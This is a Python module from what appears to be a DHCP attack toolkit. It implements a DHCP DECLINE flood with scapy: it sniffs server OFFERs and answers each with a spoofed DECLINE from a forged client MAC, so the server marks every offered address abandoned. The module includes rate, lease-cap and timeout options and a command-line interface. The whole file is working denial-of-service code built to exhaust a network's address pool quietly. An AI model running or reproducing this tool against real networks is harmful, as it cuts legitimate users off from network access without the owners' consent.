# attacks/decline.py
import threading
import time
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
from common.packet_utils import mac_str_to_bytes
from attacks.BaseDHCPAttack import BaseDHCPAttack


class DeclineFloodAttack(BaseDHCPAttack):
    """
    DHCP DECLINE flood: chases every OFFER with a spoofed DECLINE (as if an
    ARP probe found the offered address already in use), pushing the server
    to mark each address 'abandoned' instead of leasing it out. Quieter than
    full-DORA starvation — never completes DORA, so the server never ACKs.
    """

    def __init__(self, iface, rate=0.1, max_leases=None, exhaustion_timeout=5.0, logger=None):
        super().__init__(iface, rate, max_leases, exhaustion_timeout, logger)
        # DECLINE is one-way — the server never ACKs it — so "ack_received"
        # (the base class's default _cap_stat_key) would never move and
        # --max-leases would never trigger. Progress here is measured by
        # how many DECLINEs we actually sent.
        self._cap_stat_key = "decline_sent"
        self.stats["decline_sent"] = 0
        self._pending = {}
        self._land_grab_done = False

    def _send_decline(self, client_mac, offered_ip, server_ip, xid):
        pkt = (
            Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=68, dport=67)
            / BOOTP(op=1, htype=1, hlen=6, xid=xid, chaddr=mac_str_to_bytes(client_mac))
            / DHCP(options=[
                ("message-type", "decline"),
                ("server_id", server_ip),     # Option 54 — which server's OFFER this declines
                ("requested_addr", offered_ip),  # Option 50 — the address being declared "in use"
                "end",
            ])
        )
        sendp(pkt, iface=self.iface, verbose=0)
        self.stats["decline_sent"] += 1
        self.logger.info("DECLINE sent — poisoning IP=%s (offered by %s) MAC=%s", offered_ip, server_ip, client_mac)

    def _on_offer(self, offered_ip, server_ip, client_mac, xid):
        self._last_offer_at = time.monotonic()
        if self._land_grab_done:
            self.logger.debug("Ignoring late OFFER (land-grab already done) — xid=%s", hex(xid))
            return

        self._pending[xid] = {"mac": client_mac, "ip": offered_ip}
        self.logger.debug(
            "Captured OFFER — xid=%s ip=%s server=%s mac=%s",
            hex(xid), offered_ip, server_ip, client_mac,
        )
        self._send_decline(client_mac, offered_ip, server_ip, xid)

    def _on_ack(self, packet, dhcp_options, xid):
        # DECLINE never triggers a reply from the server — if an ACK does
        # show up, it's unrelated real DORA traffic on the segment, not ours.
        pass

    def _on_nak(self, packet):
        pass

    def run(self):
        self.logger.info(
            "Starting DHCP Decline flood on %s (rate=%s, max_leases=%s, exhaustion_timeout=%ss)",
            self.iface, self.rate, self.max_leases, self.exhaustion_timeout,
        )
        self._last_offer_at = time.monotonic()

        sniff_thread = threading.Thread(target=self._sniff_offers, daemon=True)
        sniff_thread.start()

        self._land_grab()
        self._land_grab_done = True

        self.print_summary()

    # --- CLI integration ---

    @classmethod
    def configure_parser(cls, parser):
        parser.add_argument("--rate", type=float, default=0.1,
                             help="Seconds between DISCOVER packets (default: 0.1)")
        parser.add_argument("--max-leases", type=int, default=None,
                             help="Stop after this many DECLINEs sent (default: unlimited)")
        parser.add_argument("--exhaustion-timeout", type=float, default=5.0,
                             help="Stop after this many seconds with no OFFER at all "
                                  "— signals pool exhaustion (default: 5.0, 0 to disable)")

    @classmethod
    def from_args(cls, args):
        timeout = args.exhaustion_timeout if args.exhaustion_timeout > 0 else None
        return cls(iface=args.iface, rate=args.rate, max_leases=args.max_leases,
                   exhaustion_timeout=timeout)
